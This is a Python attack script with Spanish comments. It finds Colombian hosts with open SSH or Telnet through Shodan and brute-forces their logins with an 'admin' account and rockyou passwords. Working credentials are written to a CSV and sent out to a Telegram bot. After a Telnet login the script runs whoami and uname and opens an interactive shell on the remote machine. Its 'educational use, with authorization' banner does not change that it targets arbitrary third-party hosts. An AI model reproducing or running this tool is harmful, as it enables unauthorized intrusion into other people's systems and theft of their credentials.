import shodan
import paramiko
import requests
import csv
import socket
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor
import threading
import socket
import logging

# Advertencia legal y confirmación del usuario
print("⚠️ ADVERTENCIA: Esta herramienta es solo para fines educativos y debe ser utilizada con autorización.")
confirmacion = input("¿Tienes autorización para auditar estas IPs? (sí/no): ").strip().lower()
if confirmacion != "si":
    print("🚫 Operación cancelada por el usuario.")
    exit()

# Configuración de logging
logging.basicConfig(filename="errors.log", level=logging.ERROR)
logging.basicConfig(filename="telnet_auditoria.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Definir la cantidad de IPs a escanear
NUM_IPS_A_ESCANEAR = 2  # Ajusta este número según lo que necesites


# Configuración de API y credenciales
API_KEY = "XXXXXXXXXXXXXX"
TELEGRAM_BOT_TOKEN = "XXXXXXXXXXXXXX"
TELEGRAM_CHAT_ID = "XXXXXXXXXXXXXX"

if not API_KEY or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    print("❌ ERROR: Faltan variables de entorno para API Key o Telegram.")
    exit()

# Variables para estadísticas
total_intentos = 0
total_exitosos = 0

total_intentos_telnet = 0
total_exitosos_telnet = 0

# Función para buscar IPs con SSH abierto en Shodan
def search_shodan(query):
    api = shodan.Shodan(API_KEY)
    try:
        result = api.search(query)
        return [service['ip_str'] for service in result['matches']]
    except shodan.APIError as e:
        logging.error(f"Error en Shodan: {e}")
        return []



# Función para enviar mensaje por Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        logging.error(f"Error enviando mensaje de Telegram: {e}")
        
lock = threading.Lock()
# Función para probar credenciales SSH
def check_ssh(ip, username, password):
    global total_intentos, total_exitosos
    with lock:
        total_intentos += 1
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, username=username, password=password, timeout=10, banner_timeout=10)
        
        print(f"✅ Acceso exitoso: {ip} - {username}:{password}")

        # Guardar en CSV
        with open("C:/Users/Julian/Desktop/accesos_exitosos.csv", "a", newline="") as file:
            writer = csv.writer(file)
            writer.writerow([ip, username, password])

        # Enviar notificación a Telegram
        send_telegram_message(f"🚀 *Acceso exitoso en* `{ip}`\n👤 Usuario: `{username}`\n🔑 Contraseña: `{password}`")
        total_exitosos += 1
        client.close()

    except paramiko.AuthenticationException:
        print(f"❌ Autenticación fallida en {ip} - {username}:{password}")
        time.sleep(1) # Evita bloqueos por demasiados intentos
    except paramiko.SSHException as e:
        print(f"⚠️ SSH Error en {ip}: {e}")
        time.sleep(1)

    except paramiko.ssh_exception.NoValidConnectionsError:
        print(f"🔴 No se pudo conectar a {ip}, el puerto podría estar cerrado.")
        time.sleep(1)

    except EOFError:
        print(f"⚠️ Conexión cerrada inesperadamente en {ip}.")
        time.sleep(1)

    except ConnectionResetError:
        print(f"🚫 Conexión reseteada por el host remoto en {ip}.")
        time.sleep(1)

    except Exception as e:
        print(f"❌ Error desconocido en {ip}: {e}")
        time.sleep(1)

    finally:
        client.close()


#def check_telnet(ip, username, password):
#   global total_intentos_telnet, total_exitosos_telnet
#    with lock:
#        total_intentos_telnet += 1

#    try:
#        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#        tn.settimeout(10)
#        tn.connect((ip, 23))  # Puerto Telnet

#        response = tn.recv(1024).decode(errors="ignore")  # Leer el banner de bienvenida
#        if "login:" in response.lower():
#            tn.sendall(username.encode() + b"\n")

#        response = tn.recv(1024).decode(errors="ignore")
#        if "password:" in response.lower():
#            tn.sendall(password.encode() + b"\n")

#        response = tn.recv(1024).decode(errors="ignore")
#        if "incorrect" not in response.lower():
#            print(f"✅ Acceso exitoso en Telnet: {ip} | Usuario: {username} | Contraseña: {password}")
#            send_telegram_message(f"🚀 *Acceso exitoso en Telnet* `{ip}`\n👤 Usuario: `{username}`\n🔑 Contraseña: `{password}`")
#            total_exitosos_telnet += 1
#        else:
#            print(f"❌ Autenticación fallida en {ip}")

#        tn.close()

#    except Exception as e:
#        logging.error(f"Error en Telnet ({ip}): {e}")

def ejecutar_comando(tn, comando):
    """ Envía un comando a Telnet y retorna la respuesta """
    tn.sendall(comando.encode() + b"\n")  
    time.sleep(1)
    try:
        respuesta = tn.recv(4096).decode(errors="ignore")
        return respuesta.strip()
    except Exception as e:
        return f"Error al recibir respuesta: {e}"

def shell_telnet(tn):
    """ Permite interactuar manualmente con Telnet """
    print("💻 Shell Telnet interactiva (escribe 'exit' para salir)")
    while True:
        comando = input("Telnet> ")
        if comando.lower() in ["exit", "salir", "quit"]:
            break
        tn.sendall(comando.encode() + b"\n")
        time.sleep(1)
        try:
            print(tn.recv(4096).decode(errors="ignore"))
        except Exception as e:
            print(f"Error en la shell interactiva: {e}")


def check_telnet(ip, username, password):
    """ Intenta conectarse por Telnet con las credenciales dadas """
    global total_intentos_telnet, total_exitosos_telnet
    with lock:
        total_intentos_telnet += 1

    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(10)
        tn.connect((ip, 23))  

        time.sleep(2)
        response = tn.recv(4096).decode(errors="ignore")  

        if "login:" not in response.lower():
            tn.sendall(b"\n")  
            time.sleep(1)
            response += tn.recv(1024).decode(errors="ignore")  

        if "login:" in response.lower():
            tn.sendall(username.encode() + b"\r\n")  

        time.sleep(1)
        response = tn.recv(1024).decode(errors="ignore")

        if "password:" in response.lower():
            tn.sendall(password.encode() + b"\r\n")  

        time.sleep(1)
        response = tn.recv(1024).decode(errors="ignore")

        if "incorrect" not in response.lower() and "failed" not in response.lower():
            mensaje = f"✅ Acceso exitoso en Telnet: {ip} | Usuario: {username} | Contraseña: {password}"
            print(mensaje)
            logging.info(mensaje)
            send_telegram_message(f"🚀 *Acceso exitoso en Telnet* `{ip}`\n👤 Usuario: `{username}`\n🔑 Contraseña: `{password}`")
            total_exitosos_telnet += 1

            # 🔥 Ejecutar comandos después del login
            user = ejecutar_comando(tn, "whoami")
            system = ejecutar_comando(tn, "uname -a")
            print(f"👤 Usuario en sistema: {user}")
            print(f"🖥️ Sistema operativo: {system}")

            # 🔥 Habilitar shell interactiva
            shell_telnet(tn)

        else:
            print(f"❌ Autenticación fallida en {ip}")

        tn.close()

    except Exception as e:
        logging.error(f"Error en Telnet ({ip}): {e}")


        
def is_ssh_open(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((ip, 22))  # Intenta conectar al puerto 22
    sock.close()
    return result == 0  # Devuelve True si la conexión fue exitosa

def is_telnet_open(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((ip, 23))  # Intenta conectar al puerto 23
    sock.close()
    return result == 0  # Devuelve True si la conexión fue exitosa


# Cargar las contraseñas desde rockyou.txt
def load_passwords(file_path):
    try:
        with open(file_path, "r", encoding="latin-1") as f:  # rockyou.txt suele estar en latin-1
            return [line.strip() for line in f if line.strip()]  # Elimina líneas vacías
    except FileNotFoundError:
        logging.error(f"No se encontró el archivo {file_path}")
        return []
    



# Buscar IPs con puerto 22 y 23 abierto en Colombia


#ssh_ips = [ip for ip in search_shodan("port:22 country:CO") if is_ssh_open(ip)]
#telnet_ips = [ip for ip in search_shodan("port:23 country:CO") if is_telnet_open(ip)]

# Buscar IPs con puerto 22 y 23 abierto en Colombia
ssh_ips = search_shodan("port:22 country:CO")[:NUM_IPS_A_ESCANEAR]
telnet_ips = search_shodan("port:23 country:CO")[:NUM_IPS_A_ESCANEAR]

# Filtrar las IPs que realmente tienen el puerto abierto
ssh_ips = [ip for ip in ssh_ips if is_ssh_open(ip)]
telnet_ips = [ip for ip in telnet_ips if is_telnet_open(ip)]

    

# Verificar si hay IPs antes de continuar
if not ssh_ips and not telnet_ips:
    print("❌ No se encontraron IPs con SSH o Telnet abiertos.")
    send_telegram_message("❌ No se encontraron IPs con SSH o Telnet abiertos en Shodan.")
    exit()

    
# Ruta del archivo rockyou.txt
rockyou_path = "C:/Users/Julian/Downloads/rockyou.txt"

# Cargar todas las contraseñas del archivo

passwords = load_passwords(rockyou_path)[:10]  # Solo las primeras 20 contraseñas


# Diccionario con usuarios y la lista de contraseñas de rockyou.txt
#credentials = {
#    "admin": passwords,  
#    "root": passwords,
#    "user": passwords
#}

credentials = {
    "admin": passwords
}


# Enviar resumen de IPs encontradas por Telegram
if ssh_ips:
    message = "🔍 *IPs con SSH abierto en Colombia:* \n" + "\n".join([f"`{ip}`" for ip in ssh_ips[:2]])  # Máximo 20 IPs
    send_telegram_message(message)

if telnet_ips:
    message = "🔍 *IPs con Telnet abierto en Colombia:* \n" + "\n".join([f"`{ip}`" for ip in telnet_ips[:2]])  # Máximo 20 IPs
    send_telegram_message(message)
else:
    send_telegram_message("❌ No se encontraron IPs con SSH abierto en Shodan.")

print(f"✅ INICIANDO AUDITORIA SSH")
# Ejecutar pruebas SSH en paralelo
with ThreadPoolExecutor(max_workers=5) as executor:
    for ip in ssh_ips:
        for username, pass_list in credentials.items():
            for password in pass_list:
                executor.submit(check_ssh, ip, username, password)

print(f"✅ INICIANDO AUDITORIA TELNET")
# Ejecutar pruebas Telnet en paralelo
with ThreadPoolExecutor(max_workers=5) as executor:
    for ip in telnet_ips:
        for username, pass_list in credentials.items():
            for password in pass_list:
                executor.submit(check_telnet, ip, username, password)

# Enviar resumen final por Telegram
send_telegram_message(f"📊 *Resumen de auditoría SSH*:\n🔹 Total intentos: `{total_intentos}`\n✅ Accesos exitosos: `{total_exitosos}`")

send_telegram_message(f"📊 *Resumen de auditoría TELNET*:\n🔹 Total intentos: `{total_intentos_telnet}`\n✅ Accesos exitosos: `{total_exitosos_telnet}`")

print(f"✅ AUDITORIAS FINALIZADAS")
